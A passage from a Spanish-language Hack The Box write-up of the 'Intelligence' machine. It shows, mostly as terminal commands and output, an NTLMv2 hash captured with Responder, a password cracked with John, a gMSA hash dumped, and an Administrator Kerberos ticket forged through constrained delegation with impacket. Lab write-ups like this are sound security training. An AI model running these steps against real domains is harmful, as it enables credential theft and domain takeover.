&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ dig webx.intelligence.htb @10.10.10.248

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; webx.intelligence.htb @10.10.10.248
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class=&#34;m&#34;&gt;29036&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; flags: qr aa rd ra&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; EDNS: version: 0, flags:&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; udp: &lt;span class=&#34;m&#34;&gt;4000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;webx.intelligence.htb.     IN  A

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; ANSWER SECTION:
webx.intelligence.htb.  &lt;span class=&#34;m&#34;&gt;180&lt;/span&gt; IN  A   10.10.14.24

&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; Query time: &lt;span class=&#34;m&#34;&gt;76&lt;/span&gt; msec
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; SERVER: 10.10.10.248#53&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; WHEN: Sun Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 02:47:20 EDT &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escuchamos con netcat el puerto 80 y obtuvimos una solicitud por parte de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ldapdomaindump&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ ldapdomaindump master ‚úó ‚ùØ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from intelligence.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.248&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61096&lt;/span&gt;
GET / HTTP/1.1
User-Agent: Mozilla/5.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows NT&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; en-US&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WindowsPowerShell/5.1.17763.1852
Host: webx
Connection: Keep-Alive
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;responder&#34;&gt;Responder&lt;/h4&gt;
&lt;p&gt;Con ello confirmamos que realiza la solicitud a cada 5 minutos, utilizamos &lt;code&gt;responder&lt;/code&gt; donde obtuvimos el hash de &lt;strong&gt;Ted.Graves&lt;/strong&gt;, ya que el script utiliza las credenciales del usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Generic Options:
    Responder NIC              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;tun0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder IP               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Challenge &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t Respond To Names     [&amp;#39;&lt;/span&gt;ISATAP&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Current Session Variables:
    Responder Machine Name     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WIN-B3PL3QLKQOU&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder Domain Name      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;YFNL.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Responder DCE-RPC Port     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;48424&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; events...

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending NTLM authentication request to 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; GET request from: 10.10.10.248     URL: /
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host             : webx
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Client   : 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Username : intelligence&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HTTP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2 Hash     : Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;john---crack-the-hash&#34;&gt;John - Crack The Hash&lt;/h4&gt;
&lt;p&gt;Crackeamos la contrase√±a de Ted utilizando John con el wordlist rockyou.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ cat hash_ted.txt
Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 œÄ ~/htb/intelligence ‚ùØ john hash_ted.txt --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;netntlmv2 --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
Mr.Teddy         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ted.Graves&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:06 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-07-11 03:11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.1582g/s 1711Kp/s 1711Kc/s 1711KC/s Mrz.deltasigma..Morgant1
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=netntlmv2&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con crackmapexec confirmamos que las credenciales nos dan acceso por smb y ldap, aunque solamente con permisos de Lectura.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ crackmapexec ldap intelligence.htb -u Ted.Graves -p Mr.Teddy
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:intelligence.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves:Mr.Teddy
 œÄ ~/htb/intelligence ‚ùØ crackmapexec smb intelligence.htb -u Ted.Graves -p Mr.Teddy --shares
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:intelligence.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves:Mr.Teddy
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               Share           Permissions     Remark
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               -----           -----------     ------
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               C$                              Default share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               IT              READ
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               Users           READ
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;h2 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/fox-it/BloodHound.py&#34;&gt;Bloodhound.py&lt;/a&gt; nos permiti√≥ recolectar informacion, importamos la informacion obtenida, con ello encontramos que el grupo &lt;code&gt;IT Support&lt;/code&gt; al cual &lt;strong&gt;Ted.Graves&lt;/strong&gt; pertenece, puede recuperar contrase√±as de cuentas en este caso &lt;code&gt;svc_int$&lt;/code&gt;, y este ultimo tiene atributos &lt;code&gt;Constrained Delegation&lt;/code&gt; sobre el Domain Controler lo que permite autenticarse como cualquier usuario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/Screenshot_20210711_034120.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gmsadumper&#34;&gt;gMSADumper&lt;/h2&gt;
&lt;p&gt;La informacion presentada en Bloodhound muestra la herramienta &lt;code&gt;GMSAPasswordReader.exe&lt;/code&gt; pero es necesario una shell por lo que utilizamos &lt;a href=&#34;https://github.com/micahvandeusen/gMSADumper&#34;&gt;gMSADumper&lt;/a&gt; para obtener el hash del usuario &lt;code&gt;svc_int$&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gMSADumper&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ gMSADumper main ‚úó ‚ùØ ./gMSADumper.py -u Ted.Graves -p Mr.Teddy --ldapserver 10.10.10.248 -d intelligence.htb
Users or groups who can &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; svc_int$:
 &amp;gt; DC$
 &amp;gt; itsupport
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gMSADumper&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ gMSADumper main ‚úó ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;getst&#34;&gt;GetST&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;getST&lt;/code&gt; para obtener un ticket para suplantar un usuario, en este caso &lt;code&gt;Administrator&lt;/code&gt;, aunque nos mostr√≥ un error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int$
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user
Kerberos SessionError: KRB_AP_ERR_SKEW&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Clock skew too great&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast#persistence&#34;&gt;Resolvimos&lt;/a&gt; este error sincronizando la hora con la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ sudo ntpdate 10.10.10.248 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int
&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; Jul 14:05:05 ntpdate&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;235302&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: step &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; server 10.10.10.248 offset +1.266772 sec
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Impersonating Administrator
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     Requesting S4U2self
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     Requesting S4U2Proxy
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Saving ticket in Administrator.ccache
 œÄ ~/htb/intelligence ‚ùØ ls -lah Administrator.ccache
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 1.6K Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 14:05 Administrator.ccache
 œÄ ~/htb/intelligence ‚ùØ
